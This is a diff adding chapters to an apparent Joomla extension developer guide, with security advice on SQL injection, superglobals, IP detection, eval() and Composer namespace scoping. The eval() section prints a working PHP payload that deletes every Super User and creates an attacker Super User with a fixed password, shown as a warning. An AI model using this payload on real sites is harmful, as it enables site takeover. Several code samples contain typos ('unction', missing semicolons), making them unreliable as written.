+      manage the asset dependencies.</para>
+
+      <para>Assets and their dependencies are declared in the
+      <filename>joomla.asset.json</filename> file located in the extension's
+      subdirectory under the <filename>media</filename> directory. So, the
+      developer should have shipped a file
+      <filename>media/plg_system_foobar/joomla.asset.json</filename> with the
+      following contents: </para>
+
+      <programlisting language="json">{
+  "$schema": "https://developer.joomla.org/schemas/json-schema/web_assets.json",
+  "name": "plg_system_foobar",
+  "version": "1.0.0",
+  "description": "Foobar plugin",
+  "license": "GPL-3.0-or-later",
+  "assets": [
+    {
+      "name": "plg_system_foobar.foobar",
+      "description": "Foobar JavaScript",
+      "type": "script",
+      "uri": "plg_system_foobar/foobar.js",
+      "dependencies": [
+        "core"
+      ],
+      "attributes": {
+        "defer": true
+      }
+    }
+  ]
+}</programlisting>
+
+      <para>This allows the developer to tell Joomla to add their script using
+      this very simple piece of code: </para>
+
+      <programlisting language="php">$document-&gt;getWebAssetManager()-&gt;useScript('plg_system_foobar.foobar');
+</programlisting>
+
+      <para>Here's the kicker. <emphasis>This is safe even if you don't check
+      the Document object type</emphasis>. Yeah, if
+      <varname>$document</varname> is a <classname>JSONDocument</classname>
+      which does not have a concept of web assets this code would still work.
+      Joomla defines the Web Asset Manager for all document types, even those
+      which can't possibly use it. It's the page renderer which will make use
+      of the dependencies, if they are supported. I know, right?! It's
+      actually an amazingly good feature! That said, it's still a good idea to
+      check the document type the way I've told you to avoid doing pointless
+      work, or introducing future bugs. </para>
+
+      <bridgehead>Putting it all together </bridgehead>
+
+      <para>Let's put everything we learned together. The tiny plugin barely
+      grew by a couple of lines and it no longer breaks the sites it is
+      installed in. The changes are in bold type:</para>
+
+      <programlisting language="php">class PlgSystemFoobar extends \Joomla\CMS\Plugin\CMSPlugin
+{
+  public function <emphasis role="bold">onAfterDispatch</emphasis>()
+   {
+      if (!\Joomla\CMS\Factory::getApplication()-&gt;isClient('<emphasis
+          role="bold">site</emphasis>')) return;
+
+      $document = \Joomla\CMS\Factory<emphasis role="bold">::getApplication()-&gt;getDocument();</emphasis>
+
+      <emphasis role="bold">if (!($document instanceof \Joomla\CMS\Document\HtmlDocument))
+      {
+         return;
+      }
+
+      $document-&gt;getWebAssetManager()-&gt;useScript('plg_system_foobar.foobar');</emphasis>
+   }
+}</programlisting>
+
+      <para>It's still short. It's still readable. It's (mostly) future-proof
+      — well, it's still using the legacy plugin structure but I was trying to
+      draw your attention to the problems, not divert your attention to the
+      plumbing covered in previous sections of this book.</para>
+    </section>
+
+    <section xml:id="plg-wam">
+      <title>Using the WebAssetManager</title>
 
       <para/>
     </section>
@@ -9997,6 +10000,827 @@ return $plugin;</programlisting>
       <title>Migration strategy</title>
 
       <para/>
+    </section>
+  </chapter>
+
+  <chapter xml:id="advice">
+    <title>General advice and code magic</title>
+
+    <para>There are a few concepts which apply universally to all Joomla
+    extension types but don't quite fit in a category of their own. There are
+    also more generic tips about what to do and what not to do when writing
+    software. In this chapter we will explore some of those things.</para>
+
+    <section xml:id="advice-write-code-dont-suck">
+      <title>Write code which doesn't suck</title>
+
+      <para>Having audited several dozens of sites with hundreds of extensions
+      I have seen the same old problems appearing in the code of extension
+      after extension. Not only they are security incidents waiting to happen,
+      they also make migrating your code to newer Joomla versions harder and
+      break your extension in said Joomla versions.</para>
+
+      <section xml:id="advice-dont-suck-hardcoded-queries">
+        <title>DON'T: Hard-coded database queries</title>
+
+        <para>I have seen bad code like this:</para>
+
+        <programlisting language="php">$query = 'SELECT `something` FROM `#__whatever` WHERE `id` = ' . $db-&gt;quote($id);</programlisting>
+
+        <para>It's even worse with there is no <code>$db-&gt;quote</code> at
+        all because that ensures it's a SQL injection waiting to
+        happen.</para>
+
+        <para>Having a hard-coded database query is really bad because you are
+        making an assumption the site runs under MySQL and that the escape
+        character is the backtick. This is not a guarantee. Moreover, are you
+        absolutely sure that you have not missed an escape in a long SQL
+        query? Would you bet your and your clients' sites' security, as well
+        as the possibility of massive fines due to GDPR if you have failed
+        miserably, on your ability to not miss anything?</para>
+
+        <para>Let's get real. Joomla has offered a database query builders
+        since version 1.6 (released in 2010) and improved it in Joomla
+        4.</para>
+
+        <para>Here's the simplest way to write the above code:</para>
+
+        <programlisting language="php">$query = $db-&gt;getQuery(true)
+  -&gt;select($db-&gt;quoteName('something'))
+  -&gt;from($db-&gt;quoteName('#__whatever'))
+  -&gt;where($db-&gt;quoteName('id') . ' = ' . $db-&gt;quote($id));</programlisting>
+
+        <para>This is still not a very good approach because <code>$id</code>
+        may look like a numeric string but actually be a hidden SQL Injection.
+        Therefore a better way to write this query is using prepared
+        statements which send the raw value of $id to the server and tell it
+        what data type it is (boolean, null, blob, string or integer). The
+        value is not interpolated into the query itself, making it perfectly
+        safe against SQL injection attacks.</para>
+
+        <programlisting language="php">$query = $db-&gt;getQuery(true)
+  -&gt;select($db-&gt;quoteName('something'))
+  -&gt;from($db-&gt;quoteName('#__whatever'))
+  -&gt;where($db-&gt;quoteName('id') . ' = :id')
+  -&gt;bind(':id', $id, \Joomla\Database\ParameterType::INTEGER);</programlisting>
+
+        <note>
+          <para>Prepared statements are only meant to be used when you have
+          data coming from a variable. If you have hard-coded data you can
+          still interpolate them after passing them through
+          <code>$db-&gt;quote()</code>.</para>
+
+          <para>Also note that any data —even data coming from another query
+          which ostensibly only includes “safe”, hard-coded data you have
+          inserted yourself in the database— MUST go through prepared
+          statements. Anything which is not hard-coded in the code currently
+          executing must be assumed to be potentially dangerous. Even data you
+          inserted in the database and the user cannot modify through the
+          interface <emphasis>can</emphasis> be modified by a malicious actor,
+          e.g. using a SQL injection vulnerability in another
+          extension.</para>
+
+          <para><emphasis role="bold">TRUST NO-ONE, NOT EVEN
+          YOURSELF.</emphasis></para>
+
+          <para>That's the motto of the security conscious developer.</para>
+        </note>
+      </section>
+
+      <section xml:id="advice-dont-suck-superglobals">
+        <title>DON'T: Using superglobalg ($_REQUEST, $_SERVER, $_GET, $_POST
+        etc)</title>
+
+        <para>Another very common problem I have seen in Joomla extensions is
+        developers doing something like this:</para>
+
+        <programlisting language="php">$something = $_REQUEST['something'];
+// or, worse, this
+$whatever = $_SERVER['WHATEVER'];</programlisting>
+
+        <para><emphasis role="bold">DO NOT DO THAT. THIS IS A SECURITY
+        ISSUE.</emphasis> There are very few cases where an extension needs
+        access to the raw PHP superglobals, namely if you are writing a
+        security extension and you need to check whether there's potentially
+        malicious data in the request before Joomla sanitizes it. If you are
+        one of the five or so people in the Joomla world writing this kind of
+        software you are unlikely to be reading this. If you are about to say
+        that you have a different, legitimate use case: you do NOT; you just
+        don't know how to use Joomla's input class. Sorry.</para>
+
+        <para>Joomla already provides an Input class which can return the
+        <emphasis>filtered and sanitised</emphasis> values of a request or
+        environment parameter. Moreover, it allows other parts of your code
+        and plugins to modify or override the input parameters.</para>
+
+        <para>The correct way to get something would be something like
+        this:</para>
+
+        <programlisting language="php">$something = \Joomla\CMS\Factory::getApplication()-&gt;input-&gt;request-&gt;getCmd('something', 'default');</programlisting>
+
+        <para>If the object you are working with has its own input property
+        use that instead of the global input object shown above. Dispatchers
+        and Controllers do have their own input object which can of course be
+        overridden during instantiation.</para>
+
+        <para>If the object you are working with has its own property which
+        gives you access to the application use that instead of going through
+        the CMS Factory. This makes your code reusable and testable across
+        applications.</para>
+
+        <para>Do NOT get input variables from your Model or View classes. Your
+        Controller should be the only point where you use the input object to
+        retrieve input parameters. You can pass these values to your model by
+        setting its <emphasis>state</emphasis>. Likewise, your view should
+        only ever read the model's state, not the input directly. This makes
+        your code reusable and testable. It also lets you make changes in the
+        naming of your input parameters only making a change in your
+        controller (and possibly your dispatcher) instead of trying to hunt
+        down random uses spread throughout your code. It also makes you think
+        about the data flow in your application which makes it infinitely
+        easier to debug it.</para>
+
+        <para>You should not use the entire request superglobal (e.g.
+        <code>$this-&gt;input-&gt;getCmd('something')</code> or
+        <code>$this-&gt;input-&gt;request-&gt;getCmd('something')</code>) if
+        you know that a specific piece of data can only come as GET or POST
+        data. Instead, be specific, e.g.
+        <code>$this-&gt;input-&gt;get-&gt;getCmd('something')</code> for GET
+        data and <code>$this-&gt;input-&gt;post-&gt;getCmd('something')</code>
+        for POST data. This prevents <emphasis>input shading</emphasis>. If
+        the same input is present in $_GET, $_POST, $_ENV, $_COOKIE and
+        $_SERVER you will only get one value in the request. Which one? It
+        depends on the PHP configuration (<code>request_order</code> and
+        <code>variables_order</code> configuration keys). While on
+        <emphasis>most</emphasis> servers it's GP (Get and Post, i.e. POST
+        data overrides GET data) it could actually be anything with
+        unpredictable consequences for your extension. For example, some
+        servers may stupidly include cookies in request_order, thereby
+        allowing a hacker to set a cookie on a victim's browser to make your
+        extension do something other than the user's reasonable expectation,
+        e.g. delete or modify a different record than what they were trying to
+        delete / edit.</para>
+
+        <para>Do not assume that the data you get from the input object is of
+        a specific scalar type. For example,
+        <code>$this-&gt;input-&gt;getInt('something')</code> may return an
+        integer, null (the default value) or <emphasis>an array of
+        integers</emphasis>. The latter is something that you are unlikely to
+        have come across but that's the way the <code>get()</code> method of
+        Joomla's input object works. Always check the type of the data you
+        receive, always assume that there is a hacker trying to inject invalid
+        data trying to trip your code up, always assume that any kind of
+        filtering or sanitization may fail to work the way you assume it
+        works.</para>
+
+        <para>If you want to access the $_SERVER and $_ENV superglobals;
+        don't. Instead go through <code>$this-&gt;input-&gt;server</code> and
+        <code>$this-&gt;input-&gt;env</code>. For example, if I want to get
+        the contents of the HTTP header X-Foo-Bar I should do
+        <code>$this-&gt;input-&gt;server-&gt;getString('HTTP_X_FOO_BAR');</code>.</para>
+
+        <para>Remember that Joomla can and will apply its text filters when
+        you use <code>getString</code>. If you want to get the raw data use
+        <methodname>getRaw</methodname> or <methodname>getArray</methodname> —
+        neither method applies any filtering.</para>
+
+        <para>Even though you can access the $_FILES superglobal with the
+        input object — <emphasis role="bold">DO NOT DO THAT</emphasis>! You
+        should never handle file uploads directly in your code. Always go
+        through Joomla's
+        <methodname>\Joomla\CMS\Filesystem\File::upload()</methodname> method.
+        Do remember that, by default, it will try to prevent unsafe files from
+        being uploaded. If you have a VERY good reason to allow “unsafe” files
+        (e.g. you expect that a ZIP file containing PHP files will be used
+        with your extension) and have taken responsible measures to prevent
+        security issues you can of course set its <code>$allowUnsafe</code>
+        parameter to <code>true</code>. If you need your extension to allow
+        uploading of files with extensions or MIME types which are not media
+        you can of course use custom file upload configuration in your own
+        extension. This means that the excuse you may have had for using
+        $_FILES directly is completely invalid so please don't let me see you
+        ever accessing superglobals again.</para>
+      </section>
+
+      <section xml:id="advice-dont-suck-remote-addr">
+        <title>DON'T: Using REMOTE_ADDR to get the user's IP</title>
+
+        <para>It is very common for extensions to need access to the user's IP
+        address. I see extensions doing silly things like this:</para>
+
+        <programlisting language="php">$ip = $_SERVER['REMOTE_ADDR'];
+$ip = $this-&gt;input-&gt;server-&gt;get('REMOTE_ADDR');</programlisting>
+
+        <para><emphasis role="bold">DO NOT DO THAT; THIS IS WRONG ON MANY
+        LEVELS!</emphasis></para>
+
+        <para>The first line tries to access the $_SERVER superglobal which,
+        as mentioned in the previous section, is a security issue waiting to
+        happen.</para>
+
+        <para>Both of these lines make a wrong assumption: that the
+        REMOTE_ADDR key of the server superglobal array will contain the
+        user's IP address. This is not true if the server is behind a load
+        balancer, CDN, firewall or any other kind of non-transparent proxy. In
+        these cases a different HTTP header —typically X-Forwarded-For— may be
+        used to convey the forwarding chain of IP addresses. However, you
+        should NOT attempt to read this header yourself for two reasons. First
+        of all, if the site is not behind a non-transparent proxy a malicious
+        actor can send a forged X-Forwarded-For header to trick your extension
+        into believing the request came from a different IP address than the
+        one it actually originates. Second, this header may contain more than
+        one IP addresses in a comma-separated list. Validating, sanitizing and
+        parsing that list is tricky and may lead to some very bad times and
+        security issues.</para>
+
+        <para>Joomla 3.10 and later (including all 4.x releases and beyond)
+        include a fork of my IPHelper class which deals with all of these
+        details automatically. They also expose user-facing options in the
+        Global Configuration so that the site owner can inform Joomla whether
+        their site is behind a non-transparent proxy server.</para>
+
+        <para>You can get the real IP address of the user with this:</para>
+
+        <programlisting language="php">$ip = \Joomla\Utilities\IpHelper::getIp();</programlisting>
+
+        <para>Even better, going through the IpHelper makes your code
+        <emphasis role="bold">testable</emphasis>. Your unit tests can simply
+        call:</para>
+
+        <programlisting language="php">\Joomla\Utilities\IpHelper::setIp('1.2.3.4');</programlisting>
+
+        <para>to set a fake IP address of your choice (IPv4 or IPv6).</para>
+
+        <para>Finally, IpHelper has two more handy methods:
+        <methodname>isIPv6</methodname> which tells you if you are dealing
+        with an IPv6 address and <methodname>IPinList</methodname> which lets
+        you figure out if an IP address is contained in an array which
+        consists of any combination of IPv4/IPv6 addresses, IPv4 ranges (e.g.
+        1.2.3.4-1.2.3.255), IPv4/IPv6 subnets in CIDR notation (e.g.
+        1.2.3.4/24) or IPv4 subnets in IP/Netmask notation (e.g.
+        192.168.1.0/255.255.255.0). Since many use cases for getting the
+        user's IP address ultimately come down to checking if it belongs in a
+        range of IP addresses or a list of allowed/blocked IP addresses you'll
+        find the latter method extremely handy. I went through the pain of
+        figuring out IP address maths and Joomla included my work in the core
+        so you don't have to deal with it yourself!</para>
+      </section>
+
+      <section xml:id="advice-dont-suck-duplicate-libraries">
+        <title>DON'T: Include duplicate copies of libraries shipped with
+        Joomla itself</title>
+
+        <para>A few weeks ago I was troubleshooting a client's Joomla 3 site
+        and I noticed that there were six extensions which in total included
+        four copies of TCPDF, six copies of SimplePie and four copies of
+        PHPMailer. All these libraries are already shipped with Joomla
+        itself.</para>
+
+        <para>Do NOT include copies of libraries already included in Joomla
+        with your software. If you absolutely have to —because you need a
+        newer version than what Joomla provides— <emphasis role="bold">DO NOT
+        USE THE SAME NAMESPACE AND CLASS NAMES</emphasis>. It will break
+        Joomla or third party extensions when your code is loaded.</para>
+
+        <para>In fact, even if you are including third libraries which are not
+        included in Joomla you should be doing one of the following:</para>
+
+        <itemizedlist>
+          <listitem>
+            <para>Do NOT load third party libraries except in a component's
+            model which is never going to be used outside of your
+            component.</para>
+          </listitem>
+
+          <listitem>
+            <para>Change the namespace of your third party libraries using
+            Rector.</para>
+          </listitem>
+        </itemizedlist>
+
+        <para>The first method is not a fool-proof way to go about it. The
+        third party library you are using may be included in Joomla or a
+        different third party extension (worst case scenario: a system plugin
+        which always loads this library) therefore causing your own code to
+        break. This happened to me when I contributed the WebAuthn code to
+        Joomla 4, thereby breaking my Login with Apple plugin which was using
+        a newer version of one of the libraries used by the WebAuthn code.
+        Oops.</para>
+
+        <para>Changing the namespace of your dependencies with Rector is
+        fairly trivial and guarantees that any third party libraries you
+        include in your code will neither interfere with core or third party
+        code, nor will they be interfered with by core or third party code.
+        It's one more (small and simple) step building your extensions but it
+        can make a massively positive difference to your clients who construct
+        their sites out of prepackaged, mass-distributed code they can't (and
+        usually don't even know how to) modify.</para>
+      </section>
+
+      <section xml:id="advice-dont-suck-evil-eval">
+        <title>DON'T: Using <code>eval()</code></title>
+
+        <para>Let me start by saying that allowing users to enter arbitrary
+        PHP code which will be executed by the site is a <emphasis
+        role="bold">VERY BAD IDEA</emphasis>. It is very easy for anyone with
+        minimal developer experience —or someone following a how-to hacking
+        guide— to take over a site. The following took me 5' to write and it's
+        a complete takeover of a site:</para>
+
+        <caution>
+          <para><emphasis role="bold">DO NOT TRY THIS ON YOUR
+          SITE!</emphasis></para>
+
+          <para>The following code deletes all Super Users and adds a new
+          Super User. This is detrimental to your site. It's only meant to
+          demonstrate how easily a site can be taken over if a developer
+          allows arbitrary PHP execution.</para>
+        </caution>
+
+        <programlisting language="php">function hackMePlenty()
+{
+    $user = \Joomla\CMS\Factory::getContainer()
+        -&gt;get(\Joomla\CMS\User\UserFactoryInterface::class)
+        -&gt;loadUserByUsername('drevil1234');
+
+    if ($user-&gt;username === 'drevil1234') return;
+
+    $db    = \Joomla\CMS\Factory::getContainer()-&gt;get('DatabaseDriver')
+    $query = $db-&gt;getQuery(true)
+        -&gt;select([$db-&gt;quoteName('id')])
+        -&gt;from($db-&gt;quoteName('#__usergroups'));
+
+    $superUserGroups = array_filter(
+        $db-&gt;setQuery($query)-&gt;loadColumn(0) ?: [],
+        function ($group) {
+            return \Joomla\CMS\Access\Access::checkGroup($group, 'core.admin');
+        }
+    );
+
+    $existingSuperUsers = array_unique(
+        array_reduce(
+            $superUserGroups,
+            function (array $carry, int $groupId) {
+                return array_merge($carry, \Joomla\CMS\Access\Access::getUsersByGroup($groupId));
+            },
+            []
+        )
+    );
+
+    if (!empty($existingSuperUsers))
+    {
+        $query = $db-&gt;getQuery(true)
+            -&gt;delete($db-&gt;quoteName('#__users'))
+            -&gt;whereIn($db-&gt;quoteName('id'), $existingSuperUsers);
+        $db-&gt;setQuery($query)-&gt;execute();
+    }
+
+    $user = new \Joomla\CMS\Table\User($db);
+    $user-&gt;save([
+        'name' =&gt; 'Evil Hacker',
+        'username' =&gt; 'drevil1234',
+        'email' =&gt; 'drevil@example.com',
+        'password' =&gt; \Joomla\CMS\User\UserHelper::hashPassword('Dr3v!L0wnzJ00'),
+        'block' =&gt; 0,
+        'sendEmail' =&gt; 1,
+        'registerDate' =&gt; (new \Joomla\CMS\Date\Date('2004-08-08 01:02:03'))-&gt;toSql(),
+        'lastVisitDate' =&gt; (new \Joomla\CMS\Date\Date())-&gt;toSql(),
+        'activation' =&gt; '',
+        'groups' =&gt; $superUserGroups
+    ]);
+}
+
+try { hackMePlenty(); } catch (\Throwable $e) { }</programlisting>
+
+        <para>For this reason, whenever I see an extension which deliberately
+        allows PHP code to be inserted and executed I am worried. If I see
+        this being allowed in an editor or other text entry field without
+        checking that the data comes from a Super User I am immediately
+        labelling the extension a massive security issue and the site
+        compromised unless proven differently.</para>
+
+        <para>As a developer you should NEVER, EVER have a feature which
+        allows direct PHP execution. This includes this happening
+        unintentionally by using the evil <code>eval()</code>. Also note that
+        most hosts disable <code>eval()</code> so idiot developers won't
+        create backdoors the size of Alaska on the sites hosted on that
+        host.</para>
+
+        <para>There are very few cases where you might want to evaluate
+        <emphasis>generated</emphasis> (as opposed to <emphasis>user
+        defined</emphasis>) PHP code. For example, when I implemented a subset
+        of the Blade template language in FOF I was converting Blade files to
+        straight up PHP. Of course, I could not run the generated code through
+        <code>eval()</code>. The solution to that is to first try to create a
+        temporary file —either in Joomla's temporary directory or a cache
+        directory— and <code>include()</code> it. If the temporary directory
+        is unwriteable you can use
+        <code>class_exists(\Joomla\Filesystem\Buffer::class, true);</code>
+        which includes Joomla's buffer class. This registers the stream
+        handler <code>buffer://</code> which creates a filesystem in memory.
+        You can write to a file in it, e.g.
+        <code>file_put_contents('buffer://foobar.php', $theContents);</code>
+        and then include it like this
+        <code>include('buffer://foobar.php');</code>. The downside with the
+        buffer method is that on some hosts with hardened PHP runtimes you
+        cannot include executable files from stream wrappers which have not
+        been explicitly allowed by the server administrator. Hence the need to
+        go through the filesystem first.</para>
+
+        <para>As I said, you should only ever evaluate PHP code in your
+        extensions if you have written it or if your own code has generated
+        it. <emphasis role="bold">DO NOT TRUST THE USER —NOT EVEN SUPER USERS—
+        TO PROVIDE EXECUTABLE PHP CODE THEMSELVES; IT IS A MASSIVE SECURITY
+        ISSUE</emphasis>. Do you hear that, form component developers? Your
+        extensions make it trivial to hack people's sites. Fix 'em!</para>
+      </section>
+    </section>
+
+    <section xml:id="advice-composer">
+      <title>Adding Composer dependencies</title>
+
+      <para>In many cases you will need to use third party libraries. The most
+      common way to do that is through <link
+      xlink:href="https://getcomposer.org">Composer</link>. I will assume that
+      you already know how to use Composer. If not, use your favourite search
+      engine to look for “Composer tutorial for beginners” to get you
+      started.</para>
+
+      <bridgehead>Joomla's Composer dependencies: can't touch
+      this!</bridgehead>
+
+      <para>Joomla itself uses Composer for some third party dependencies in
+      its core libraries and core components. You will find Joomla's Composer
+      dependencies in your site's <filename>libraries/vendor</filename>
+      folder. As you can see, even the Joomla Framework is pulled in as a
+      Composer dependency along with several third party libraries.</para>
+
+      <caution>
+        <para><emphasis role="bold">You MUST NEVER remove, upgrade, downgrade,
+        modify, replace or otherwise interfere with the Composer dependencies
+        provided by Joomla itself</emphasis>. Doing so is considered a
+        <emphasis role="bold">core hack</emphasis> and will disqualify you
+        from receiving support by third party developers, as well as getting
+        your extensions unlisted from the Joomla Extensions Directory (JED).
+        You will also be breaking Joomla and third party software with
+        everything that entails to your reputation as a developer.</para>
+      </caution>
+
+      <bridgehead>Adding a composer.json to your extension</bridgehead>
+
+      <para>The correct way to add Composer dependencies is to simply create a
+      <filename>composer.json</filename> file in your repository's root and
+      install your vendor folder alongside your extension's
+      <filename>src</filename> folder. You can see an example of that in
+      action <link xlink:href="https://github.com/akeeba/sociallogin">in
+      Akeeba SocialLogin's repository</link>. The relevant part of the file is
+      the following:</para>
+
+      <programlisting language="json">{
+"config": {
+   "vendor-dir": "plugins/system/sociallogin/vendor"
+   "platform": {
+      "php": "7.4.0"
+    }
+  }
+}</programlisting>
+
+      <para>The <parameter>vendor-dir</parameter> parameter tells Composer
+      where to place the Composer vendor folder. As you can see, in this
+      collection of plugins we chose to put it in the system plugin, next to
+      its src directory
+      (<filename>plugins/system/sociallogin/src</filename>).</para>
+
+      <para>The <parameter>platform</parameter> block is optional but you
+      SHOULD include it. It tells Composer to not look into the current PHP
+      version it is executing in but instead install extensions valid for a
+      specific PHP version. In this example it's for PHP 7.4.0. Set this to
+      the minimum PHP version you are targeting in your extension.</para>
+
+      <tip>
+        <para>It is good practice to NOT include your
+        <filename>composer.json</filename> and
+        <filename>composer.lock</filename> files in the final distribution of
+        your files to the user. You do not want them to mess around with your
+        dependencies. Moreover, these files would be web accessible which
+        would let an attacker very easily enumerate your dependencies and find
+        old, vulnerable versions they can target in an attempt to attack the
+        site.</para>
+
+        <para>You MUST commit your <filename>composer.json</filename> and
+        <filename>composer.lock</filename> files to your repository.</para>
+
+        <para>You MUST NOT commit your <filename>vendor</filename> directory
+        to your repository.</para>
+      </tip>
+
+      <bridgehead>Including Composer dependencies in your runtime
+      code</bridgehead>
+
+      <para>Once you install your dependencies you just have a
+      <filename>vendor</filename> folder. Your dependencies are not loaded
+      automatically as it is. You will need to somehow include your
+      <filename>vendor/autoload.php</filename> file when your code executes.
+      The best place to do that is in your service provider.</para>
+
+      <note>
+        <para>The repository I am using as an example uses the latter option
+        but that's only because I know that the Composer dependencies will not
+        be used outside the context of my event handlers. If you have a
+        component which uses the Composer dependencies in its Models and you
+        reasonable expect said Models to be used outside the component itself
+        you definitely need to load your dependencies in the service locator.
+        Remember, the <emphasis>canonical</emphasis> way to get a Model object
+        for a component is to boot the component to get its MVCFactory which
+        means that the service provider file is included.</para>
+      </note>
+
+      <para>Let's say that you have the following
+      <filename>services/provider.php</filename> file:</para>
+
+      <programlisting language="php">defined('_JEXEC') || die;
+
+use Joomla\CMS\Extension\PluginInterface;
+use Joomla\CMS\Plugin\PluginHelper;
+use Joomla\DI\Container;
+use Joomla\DI\ServiceProviderInterface;
+use Joomla\Event\DispatcherInterface;
+use Joomla\Plugin\System\Example\Extension\Example;
+
+return new class implements ServiceProviderInterface {
+  public function register(Container $container)
+  {
+    $container-&gt;set(
+      PluginInterface::class,
+      unction (Container $container) {
+        $subject = $container-&gt;get(DispatcherInterface::class);
+        $config  = (array) PluginHelper::getPlugin('system', 'example');
+        
+        return new Example($subject, $config)
+      }
+    );
+  }
+};</programlisting>
+
+      <para>You can load your Composer autoloader before returning the
+      anonymous class (see the part in bold type):</para>
+
+      <programlisting language="php">defined('_JEXEC') || die;
+
+use Joomla\CMS\Extension\PluginInterface;
+use Joomla\CMS\Plugin\PluginHelper;
+use Joomla\DI\Container;
+use Joomla\DI\ServiceProviderInterface;
+use Joomla\Event\DispatcherInterface;
+use Joomla\Plugin\System\Example\Extension\Example;
+
+<emphasis role="bold">require_once __DIR__ . '/../vendor/autoload.php';</emphasis>
+
+return new class implements ServiceProviderInterface {
+  public function register(Container $container)
+  {
+    $container-&gt;set(
+      PluginInterface::class,
+      unction (Container $container) {
+        $subject = $container-&gt;get(DispatcherInterface::class);
+        $config  = (array) PluginHelper::getPlugin('system', 'example');
+        
+        return new Example($subject, $config)
+      }
+    );
+  }
+};</programlisting>
+
+      <para>There is a caveat, though. If someone tries to use one of your
+      classes outside your extension <emphasis>without</emphasis> booting your
+      extension first it will fail. Well, they should never do that. That's
+      not how Joomla 4 and beyond is meant to be used.</para>
+
+      <bridgehead>Dealing with namespace clashes and older dependency versions
+      included with Joomla</bridgehead>
+
+      <para>There might be times where you have to deal with namespace
+      clashes. For example, you might be pulling in a dependency which is
+      already shipped as an older version in Joomla itself, a dependency which
+      depends on something else which already exists in Joomla itself as an
+      older version, or you might be pulling in a common dependency that other
+      extensions also pull in. Namespaces are global in PHP. You cannot have a
+      “private” container where you can override namespaced classes defined
+      elsewhere.</para>
+
+      <para>First, let's get a simple example
+      <filename>composer.json</filename> which pulls in a dependency already
+      defined in Joomla:</para>
+
+      <programlisting language="json">{
+  "name": "acme/example",
+  "type": "project",
+  "config": {
+    "vendor-dir": "components/com_example/vendor",
+    "platform": {
+      "php": "7.2.5"
+    }
+  },
+  "require": {
+    "lcobucci/jwt": "^4.0"
+  }
+}</programlisting>
+
+      <para>The <parameter>lcobucci/jwt</parameter> dependency already exists
+      in Joomla 4 but it's in version 3.x of that library. We want to use
+      version 4 of the library which is incompatible with version 4 but has
+      the same namespace, <classname>Lcobucci\JWT</classname>. Here's the
+      thing. If our dependency is loaded before Joomla's then Joomla's
+      WebAuthn system plugin which depends on it will break. If Joomla loads
+      its own dependency first then our extension breaks. This is an impasse,
+      isn't it?</para>
+
+      <para>The solution to that is <emphasis role="bold">changing the
+      namespaces of your dependencies, adding a prefix with <link
+      xlink:href="https://github.com/humbug/php-scoper">PHP -Scoper</link>
+      </emphasis>. But first, a few things to make sure everything will
+      work.</para>
+
+      <para>First, we need to install PHP-Scoper as a Composer global
+      dependency. From the command line:</para>
+
+      <screen>$ composer global require humbug/php-scoper</screen>
+
+      <para>Your global <filename>vendor/bin</filename> directory is in your
+      path. In most cases you have to make sure that your shell resource file
+      (e.g. <filename>~/.bashrc</filename> or <filename>~/.zshrc</filename>)
+      has a line like this:</para>
+
+      <programlisting language="bash">export PATH="~/.composer/vendor/bin:$PATH"</programlisting>
+
+      <para>On Windows, if you have installed Composer using its installer
+      then this path is already added to your path. If not, you will have to
+      add it yourself. If you had to add it to your path, close and reopen
+      your terminal emulator or simply log out and log back in. Then we can
+      check if Rector is globally available from the command line</para>
+
+      <screen>$ php-scoper -V
+PhpScoper version 0.17.6@b528b87</screen>
+
+      <para>If you instead get an error that the command is not found please
+      make sure that you have PHP installed somewhere it can be found by your
+      shell and that you've added Composer's global
+      <filename>vendor/bin</filename> directory in your path.</para>
+
+      <para>The next step is understanding how PHP-Scoper works. It processes
+      a source directory and adds a namespace prefix (“scope”) to
+      <emphasis>all classes</emphasis> within that directory. However, it does
+      NOT overwrite the files in-place; it outputs them to a build
+      directory.</para>
+
+      <para>We want to add a namespace prefix to everything in our
+      <filename>vendor</filename> directory which is currently next to our
+      extension's <filename>src</filename> directory. Here's what we are going
+      to do. We are going to move the unprefixed, original
+      <filename>vendor</filename> directory in our repository's root and have
+      the prefixed, <emphasis>modified</emphasis> <filename>vendor</filename>
+      directory next to our <filename>src</filename> directory.</para>
+
+      <para>So, the first thing to do is changing our
+      <filename>composer.json</filename> file, removing the
+      <parameter>vendor-dir</parameter> configuration key:</para>
+
+      <programlisting language="json">{
+  "name": "acme/example",
+  "type": "project",
+  "config": {
+    "platform": {
+      "php": "7.2.5"
+    }
+  },
+  "require": {
+    "lcobucci/jwt": "^4.0"
+  }
+}</programlisting>
+
+      <para>Next up, delete the old <filename>vendor</filename> directory and
+      reinstall the dependencies:</para>
+
+      <screen>$ rm -rf components/com_example/vendor
+$ composer install</screen>
+
+      <para>You now see a <filename>vendor</filename> folder in your
+      repository's root. That's good!</para>
+
+      <para>We can now configure PHP-Scoper. Create the file
+      <filename>scoper.inc.php</filename> in the repository's root:</para>
+
+      <programlisting language="php">&lt;?php
+
+declare(strict_types=1);
+
+use Isolated\Symfony\Component\Finder\Finder;
+
+return [
+    <emphasis role="bold">'prefix' =&gt; 'Acme\\Example\\Dependencies',</emphasis>
+
+    'finders' =&gt; [
+        Finder::create()
+            -&gt;files()
+            -&gt;ignoreVCS(true)
+            -&gt;notName('/LICENSE|.*\\.md|.*\\.dist|Makefile|composer\\.json|composer\\.lock/')
+            -&gt;exclude([
+                'doc',
+                'test',
+                'test_old',
+                'tests',
+                'Tests',
+                'vendor-bin',
+            ])
+            -&gt;in('vendor'),
+        Finder::create()-&gt;append([
+            'composer.json',
+        ]),
+    ],
+
+    'exclude-files' =&gt; [],
+    'patchers' =&gt; [],
+    'exclude-namespaces' =&gt; [],
+    'exclude-classes' =&gt; [],
+    'exclude-functions' =&gt; [],
+    'exclude-constants' =&gt; [],
+
+    'expose-global-constants' =&gt; true,
+    'expose-global-classes' =&gt; true,
+    'expose-global-functions' =&gt; true,
+    'expose-namespaces' =&gt; [],
+    'expose-classes' =&gt; [],
+    'expose-functions' =&gt; [],
+    'expose-constants' =&gt; [],
+];</programlisting>
+
+      <para>It's mostly boilerplate, except for the line in bold. This line
+      defines the prefix we're adding to all classes. As configured above, our
+      dependency's namespace will change from
+      <classname>Lcobucci\JWT</classname> to our prefixed,
+      <emphasis>private</emphasis> namespace
+      <classname>Acme\Example\Dependencies\Lcobucci\JWT</classname>. </para>
+
+      <para>Now run:</para>
+
+      <screen>$ php-scoper add-prefix --output-dir components/com_example/dependencies</screen>
+
+      <para>You will see that a new <filename>dependencies</filename>
+      directory was created next to our extension's <filename>src</filename>
+      directory.</para>
+
